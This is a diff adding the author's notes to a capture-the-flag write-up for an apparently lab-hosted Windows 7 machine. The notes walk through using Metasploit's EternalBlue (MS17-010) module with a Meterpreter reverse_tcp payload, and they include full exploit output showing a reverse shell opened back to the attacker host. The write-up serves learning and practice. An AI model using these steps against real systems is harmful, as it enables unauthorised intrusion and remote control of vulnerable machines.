@@ -116,37 +116,142 @@ Host script results:
 
 The vulnerability scan shows that the machine is vulnerable to `CVE-2017-0143`
 - [NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-0143)
-	
 
-* **Vulnerability 2 (if any):**
-    * Repeat the same format for any additional vulnerabilities.
+```text
+A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 1.0 (SMBv1) server handles certain requests. An attacker who successfully exploited the vulnerability could gain the ability to execute code on the target server.
+```
 
+So it seems like the machine is vulnerable to certain Remote Code Execution.
+Checking Metasploit gave me a lot of choices...
+
+```bash
+msf6 search CVE-2017-0143
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                  .                .        .      .
+   2     \_ target: Windows 7                         .                .        .      .
+   3     \_ target: Windows Embedded Standard 7       .                .        .      .
+   4     \_ target: Windows Server 2008 R2            .                .        .      .
+   5     \_ target: Windows 8                         .                .        .      .
+   6     \_ target: Windows 8.1                       .                .        .      .
+   7     \_ target: Windows Server 2012               .                .        .      .
+   8     \_ target: Windows 10 Pro                    .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11    \_ target: Automatic                         .                .        .      .
+   12    \_ target: PowerShell                        .                .        .      .
+   13    \_ target: Native upload                     .                .        .      .
+   14    \_ target: MOF upload                        .                .        .      .
+   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   18    \_ AKA: ETERNALBLUE                          .                .        .      .
+   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   23    \_ AKA: ETERNALBLUE                          .                .        .      .
+   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
+   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
+   26    \_ AKA: ETERNALBLUE                          .                .        .      .
+   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+   28    \_ target: Execute payload (x64)             .                .        .      .
+   29    \_ target: Neutralize implant                .                .        .      .
+```
+
+I initially chose #27 (DOUBLEPULSAR RCE) simply because it has `great` in rank, but this module was not the appropriate one for the current vulnerability.
+
+Looking through other exploits, I found a module in #0 mentioning `eternalblue` . This was mentioned in the description of the machine. 
+
+```bash
+
+msf6 exploit(windows/smb/smb_doublepulsar_rce) > use 0
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Wind
+                                             ows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows
+                                             Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded S
+                                             tandard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     172.16.193.129   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+```
+
+The module asked me for RHOST ( Target ) and LHOST (Attacker IP) .  After setting up those, I ran and got the foothold. 
+
+```bash
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.3:4444 
+[*] 10.129.232.182:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.129.232.182:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.129.232.182:445    - Scanned 1 of 1 hosts (100% complete)
+[+] 10.129.232.182:445 - The target is vulnerable.
+[*] 10.129.232.182:445 - Connecting to target for exploitation.
+[+] 10.129.232.182:445 - Connection established for exploitation.
+[+] 10.129.232.182:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.129.232.182:445 - CORE raw buffer dump (42 bytes)
+[*] 10.129.232.182:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.129.232.182:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.129.232.182:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.129.232.182:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.129.232.182:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.129.232.182:445 - Sending all but last fragment of exploit packet
+[*] 10.129.232.182:445 - Starting non-paged pool grooming
+[+] 10.129.232.182:445 - Sending SMBv2 buffers
+[+] 10.129.232.182:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.129.232.182:445 - Sending final SMBv2 buffers.
+[*] 10.129.232.182:445 - Sending last fragment of exploit packet!
+[*] 10.129.232.182:445 - Receiving response from exploit packet
+[+] 10.129.232.182:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.129.232.182:445 - Sending egg to corrupted connection.
+[*] 10.129.232.182:445 - Triggering free of corrupted buffer.
+[*] Sending stage (201798 bytes) to 10.129.232.182
+[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.232.182:49158) at 2024-10-10 23:24:54 +0900
+[+] 10.129.232.182:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.129.232.182:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.129.232.182:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+```
 ## Exploitation
 
-* **Gaining Initial Access:**
-    * Step-by-step explanation of how you exploited the vulnerability to gain initial access to the machine.
-    * ```
-      [Include any relevant code snippets or commands used]
-      ```
-* **Privilege Escalation (if applicable):**
-    * Describe the privilege escalation technique used.
-    * Provide details of any exploits or misconfigurations leveraged.
-* **Proof of Access:**
-    * ![Screenshot of flags or other evidence]
+After gaining access to the machine from the eternalblue module, I looked through the machine and found `User` and `Administrator` . 
 
-## Post-Exploitation
-
-* **Further Enumeration:**
-    * Any additional information gathered after gaining access (interesting files, configurations, etc.).
-* **Lateral Movement (if applicable):**
-    * Explain how you moved to other machines on the network (if any).
-
+Under `User`, I found `haris` and i found the `user.txt` under his desktop. I found the `root.txt` under `Administrator`'s `desktop`
 ## Lessons Learned
 
-* Key takeaways from the challenge.
-* What you learned about the specific vulnerabilities or techniques used.
-* Any areas where you could have improved your approach.
-
+- The recon to get info
 ## Conclusion
 
 * Summarize your overall experience with the machine.
